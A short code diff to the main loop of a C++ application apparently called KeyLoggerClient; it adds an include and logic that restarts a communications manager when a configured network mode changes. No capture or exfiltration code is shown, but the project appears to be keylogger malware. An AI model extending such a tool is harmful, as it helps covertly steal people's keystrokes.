@@ -1,3 +1,4 @@
+// KeyLoggerClient/src/core/Application.cpp
 #include "core/Application.h"
 #include "core/Configuration.h"
 #include "core/Logger.h"
@@ -10,6 +11,7 @@
 #include "data/DataManager.h"
 #include "utils/SystemUtils.h"
 #include "utils/FileUtils.h"
+#include "utils/TimeUtils.h"
 #include <thread>
 #include <chrono>
 #include <string>
@@ -73,8 +75,18 @@ void Application::Run() {
     m_running = true;
     LOG_INFO("Application starting main loop");
 
-    // Main application loop
+    std::string lastNetworkMode = "";
+    
     while (m_running) {
+        // Check for network mode changes
+        std::string currentNetworkMode = m_config->GetNetworkMode();
+        if (currentNetworkMode != lastNetworkMode) {
+            LOG_INFO("Network mode changed, reinitializing communication");
+            m_commsManager->Shutdown();
+            m_commsManager->Initialize();
+            lastNetworkMode = currentNetworkMode;
+        }
+        
         // Check for exit conditions
         if (utils::SystemUtils::IsExitTriggered()) {
             Shutdown();
